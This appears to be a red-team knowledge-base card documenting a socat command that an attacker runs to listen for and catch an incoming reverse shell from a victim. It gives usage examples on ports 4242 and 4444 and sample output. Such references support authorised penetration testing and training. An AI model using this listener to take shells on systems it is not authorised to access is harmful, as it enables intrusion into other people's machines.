---
id: uuid-attacker-listener
name: socat-attacker-listener
type: command
executor: bash
data: 'socat file:`tty`,raw,echo=0 TCP-L:$_PORT'
output: null
created_at: '2023-04-06T03:56:24.199253+00:00'
updated_at: '2023-04-10T20:25:32.757798+00:00'
platforms:
  - Linux
tags:
  - reverse-shell
  - listener
  - socat
verified: true
validated: true
---

# socat-attacker-listener

## Command

```bash
socat file:`tty`,raw,echo=0 TCP-L:$_PORT
```

## Description

This command sets up a Socat listener on the attacker machine to receive an incoming reverse shell connection from a target. It configures a raw TTY for interactive shell access without local echo, allowing seamless command execution once connected.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_PORT | The TCP port to listen on (e.g., 4242) | Yes |
| file:`tty`,raw,echo=0 | Binds to TTY with raw mode and no echo for clean interaction | Built-in |
| TCP-L | Specifies TCP listen mode | Built-in |

## Examples

### Basic Usage

```bash
socat file:`tty`,raw,echo=0 TCP-L:4242
```

### Advanced Usage

Use a different port if 4242 is in use:

```bash
socat file:`tty`,raw,echo=0 TCP-L:4444
```

## Expected Output

```
2023/04/06 10:00:00 socat[1234] N PTY is /dev/pts/0
2023/04/06 10:00:00 socat[1234] N reading on PTY=/dev/pts/0
2023/04/06 10:00:05 socat[1234] N accepting new socket fd=5 on AF=2 "0.0.0.0:4242"
2023/04/06 10:00:05 socat[1234] N starting data transfer loop with FDs [5,5] and [3,0]
```

The listener waits for a connection; upon success, it displays the victim's shell prompt (e.g., bash-5.1$).

## Related

- [[procedures/Establish-Reverse-Shell-Using-Socat]]
- [[commands/socat-victim-connect-installed]]
